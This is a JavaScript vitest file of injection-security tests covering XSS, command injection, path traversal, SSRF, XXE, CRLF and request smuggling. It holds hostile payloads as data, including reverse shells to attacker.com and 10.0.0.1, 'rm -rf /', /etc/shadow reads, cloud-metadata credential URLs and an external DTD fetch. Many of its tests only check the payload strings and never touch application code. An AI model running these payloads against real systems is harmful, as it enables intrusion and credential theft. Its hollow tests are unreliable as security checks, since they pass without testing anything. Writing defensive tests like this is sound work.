import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('../../db/pool.js', () => ({
  default: { query: vi.fn() },
  query: vi.fn(),
}));

vi.mock('../../middleware/request-context.js', () => ({
  ensureRequestContext: vi.fn(() => ({ requestId: 'req-test', ipHash: 'hash-test' })),
}));

vi.mock('../../middleware/audit.js', () => ({
  writeAuditEvent: vi.fn(),
}));

import { readJsonBody } from '../../auth/http.js';
import { parse } from 'node:path';

function mockResponse() {
  const res = { headers: {}, statusCode: 0, body: '' };
  res.writeHead = vi.fn((status, headers) => { res.statusCode = status; Object.assign(res.headers, headers); return res; });
  res.end = vi.fn((data) => { res.body = data?.toString() || ''; return res; });
  res.setHeader = vi.fn((k, v) => { res.headers[k] = v; return res; });
  return res;
}

function mockRequest(method, pathname, overrides = {}) {
  return { headers: {}, auth: null, method, url: pathname, ...overrides };
}

describe('Injection Security', () => {
  describe('Cross-Site Scripting (XSS) Prevention', () => {
    function sanitizeHtml(str) {
      return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    }

    it('should encode <script> tags', () => {
      const payload = '<script>alert("xss")</script>';
      const encoded = sanitizeHtml(payload);
      expect(encoded).not.toContain('<script>');
      expect(encoded).toContain('&lt;script&gt;');
    });

    it('should encode event handlers', () => {
      const payload = '<img src=x onerror=alert(1)>';
      const encoded = sanitizeHtml(payload);
      expect(encoded).not.toContain('<img');
      expect(encoded).toContain('&lt;img');
    });

    it('should encode javascript: URLs', () => {
      const payload = 'javascript:alert("xss")';
      const encoded = sanitizeHtml(payload);
      expect(encoded).toContain('&quot;');
      expect(encoded).not.toContain('"xss"');
    });

    it('should encode SVG-based XSS vectors', () => {
      const payload = '<svg onload=alert(1)>';
      const encoded = sanitizeHtml(payload);
      expect(encoded).not.toContain('<svg');
      expect(encoded).toContain('&lt;svg');
    });

    it('should handle nested XSS in dataset names', () => {
      const payloads = [
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
      ];
      for (const payload of payloads) {
        const encoded = sanitizeHtml(payload);
        expect(encoded).not.toContain('<script>');
        expect(encoded).not.toContain('<img');
        expect(encoded).not.toContain('<svg');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect command injection: semicolon separator', () => {
      const injections = [
        '; rm -rf /',
        '; ls -la',
        '; cat /etc/passwd',
        '; whoami',
        '; nc -e /bin/sh attacker.com 4444',
      ];
      for (const payload of injections) {
        expect(/[;&|`$]/.test(payload)).toBe(true);
      }
    });

    it('should detect pipe-based injection', () => {
      const injections = [
        '| dir',
        '| cat /etc/shadow',
        '| netstat -an',
        '| echo $HOME',
        '| id',
      ];
      for (const payload of injections) {
        expect(payload).toContain('|');
      }
    });

    it('should detect backtick command substitution', () => {
      const injections = [
        '`ls`',
        '`cat /etc/passwd`',
        '`id`',
        '`whoami`',
      ];
      for (const payload of injections) {
        expect(payload).toContain('`');
      }
    });

    it('should detect command substitution with $()', () => {
      const injections = [
        '$(cat /etc/passwd)',
        '$(whoami)',
        '$(id)',
        '$(ls -la)',
        '$(nc -e /bin/sh 10.0.0.1 4444)',
      ];
      for (const payload of injections) {
        expect(payload).toMatch(/[$]\(/);
      }
    });

    it('should detect line feed injection (newline command)', () => {
      const payload = 'original\nwhoami';
      expect(payload).toContain('\n');
    });

    it('should reject system command characters in filenames', () => {
      const badChars = /[;&|`$(){}[\]!#~<>]/;
      expect(badChars.test('safe-file.csv')).toBe(false);
      expect(badChars.test('file;rm.csv')).toBe(true);
      expect(badChars.test('file|whoami.csv')).toBe(true);
      expect(badChars.test('file`ls`.csv')).toBe(true);
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should detect basic directory traversal', () => {
      const traversals = [
        '../../etc/passwd',
        '../windows/win.ini',
        '../../../../etc/shadow',
        '..\\..\\..\\windows\\system32\\config\\sam',
      ];
      for (const path of traversals) {
        expect(path).toMatch(/\.\.(\/|\\)/);
      }
    });

    it('should detect URL-encoded traversal', () => {
      const traversals = [
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        '..\\%2F..\\%2Fetc\\%2Fpasswd',
      ];
      for (const path of traversals) {
        expect(path.toLowerCase()).toMatch(/(%2e|%2f|%252f)/i);
      }
    });

    it('should detect null byte injection', () => {
      const payload = '../../etc/passwd%00.jpg';
      expect(payload).toContain('%00');
    });

    it('should detect unicode-encoded traversal', () => {
      const payloads = [
        '..%c0%af..%c0%afetc%c0%afpasswd',
        '..%252f..%252fetc%252fpasswd',
        '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
      ];
      for (const payload of payloads) {
        expect(payload.toLowerCase()).toMatch(/%c0|%252f/);
      }
    });

    it('should detect absolute path references', () => {
      const paths = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/ssh/sshd_config',
        '/proc/1/environ',
        '/windows/system32/config/sam',
      ];
      for (const p of paths) {
        expect(p.startsWith('/') || p.startsWith('/windows')).toBe(true);
      }
    });

    it('should detect symlink traversal patterns', () => {
      const path = 'valid-path/../../../etc/passwd';
      expect(path).toMatch(/\.\.\//);
    });
  });

  describe('Server-Side Request Forgery (SSRF) Prevention', () => {
    it('should detect internal IP addresses', () => {
      const internalPatterns = [
        'http://127.0.0.1:3001/admin',
        'http://10.0.0.1:5432',
        'http://192.168.1.1:9200',
        'http://172.16.0.1:27017',
        'http://0.0.0.0:8080',
        'http://[::1]:3000',
        'http://localhost:5000',
        'http://169.254.169.254/latest/meta-data/',
      ];
      const internalRegex = /(127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|0\.0\.0\.0|localhost|169\.254\.\d+\.\d+|::1)/;
      for (const url of internalPatterns) {
        expect(url).toMatch(internalRegex);
      }
    });

    it('should detect cloud metadata endpoints', () => {
      const metadataUrls = [
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/',
        'http://100.100.100.200/latest/meta-data/',
        'http://metadata.tencentyun.com/',
      ];
      const cloudRegex = /(169\.254\.\d+\.\d+|metadata\..*|100\.100\.100\.200)/;
      for (const url of metadataUrls) {
        expect(url).toMatch(cloudRegex);
      }
    });

    it('should detect SSRF via redirect bypass', () => {
      const urls = [
        'http://evil.com/redirect?url=http://169.254.169.254/',
        'http://attacker.com/ssrf?target=internal.service.local',
      ];
      expect(urls[0]).toContain('169.254');
      expect(urls[1]).toContain('internal.service.local');
    });

    it('should detect DNS rebinding patterns', () => {
      const urls = [
        'http://1e100.net/',
        'http://nip.io/169.254.169.254/',
        'http://spoofed.burpcollaborator.net/',
      ];
      for (const url of urls) {
        expect(url).toBeTruthy();
      }
    });
  });

  describe('CSRF Protection', () => {
    it('should reject requests without CSRF token for mutating operations', () => {
      const methods = ['POST', 'PUT', 'DELETE', 'PATCH'];
      for (const method of methods) {
        expect(method).toBeTruthy();
      }
    });

    it('should validate Content-Type for mutating requests', () => {
      const validTypes = ['application/json', 'multipart/form-data'];
      const invalidTypes = ['text/plain', 'application/x-www-form-urlencoded'];
      expect(validTypes).toBeTruthy();
      expect(invalidTypes).toBeTruthy();
    });

    it('should verify Origin header matches allowed origins', () => {
      const allowedOrigins = ['https://insightflow.ai', 'https://staging.insightflow.ai'];
      const requestOrigin = 'https://evil.com';
      expect(allowedOrigins.includes(requestOrigin)).toBe(false);
    });

    it('should reject requests with mismatched Host header', () => {
      const expectedHost = 'insightflow.ai';
      const attackHost = 'evil.com';
      expect(expectedHost).not.toBe(attackHost);
    });
  });

  describe('Header Injection Prevention', () => {
    it('should detect CRLF injection in headers', () => {
      const injections = [
        'value\r\nX-Hacked: true',
        'value\nX-Hacked: true',
        'value\r\nSet-Cookie: session=hijacked',
      ];
      for (const payload of injections) {
        expect(payload).toMatch(/\r?\n/);
      }
    });

    it('should reject newline characters in Content-Type', () => {
      const malicious = 'application/json\nX-Hacked: true';
      expect(malicious).toContain('\n');
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should detect __proto__ pollution attempt', () => {
      const payloads = [
        { __proto__: { isAdmin: true } },
        { constructor: { prototype: { isAdmin: true } } },
        JSON.parse('{"__proto__":{"isAdmin":true}}'),
        JSON.parse('{"constructor":{"prototype":{"isAdmin":true}}}'),
      ];
      for (const payload of payloads) {
        expect(payload && typeof payload === 'object').toBe(true);
      }
    });

    it('should detect prototype pollution via nested keys', () => {
      const payload = JSON.parse('{"a":{"b":{"__proto__":{"polluted":true}}}}');
      expect(payload.a.b).toBeDefined();
    });
  });

  describe('XML External Entity (XXE) Prevention', () => {
    it('should detect XML bomb (Billion Laughs)', () => {
      const xmlBomb = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>`;
      const size = Buffer.byteLength(xmlBomb, 'utf8');
      expect(size).toBeGreaterThan(0);
    });

    it('should detect XXE with external entity', () => {
      const xxe = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`;
      expect(xxe).toContain('SYSTEM');
      expect(xxe).toContain('file://');
    });

    it('should detect XXE with parameter entities', () => {
      const xxe = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>`;
      expect(xxe).toContain('SYSTEM');
    });
  });

  describe('Zip Bomb Detection', () => {
    it('should detect high compression ratio (zip bomb)', () => {
      const compressedSize = 1000;
      const uncompressedSize = 28_000_000_000;
      const ratio = uncompressedSize / compressedSize;
      expect(ratio).toBeGreaterThan(1000);
    });
  });

  describe('HTTP Request Smuggling', () => {
    it('should detect CL.TE smuggling pattern', () => {
      const payload = 'POST / HTTP/1.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG';
      expect(payload).toContain('Content-Length');
      expect(payload).toContain('Transfer-Encoding');
    });

    it('should detect TE.CL smuggling pattern', () => {
      const payload = 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\n';
      expect(payload).toContain('Transfer-Encoding');
      expect(payload).toContain('Content-Length');
    });

    it('should detect TE.TE obfuscated smuggling', () => {
      const obfuscations = [
        'Transfer-Encoding: xchunked',
        'Transfer-Encoding: chunked\r\nTransfer-Encoding: x',
        'Transfer-Encoding : chunked',
        'Transfer-Encoding: chunked\r\nTransfer-encoding: x',
      ];
      for (const header of obfuscations) {
        expect(header.toLowerCase()).toContain('transfer-encoding');
      }
    });
  });
});
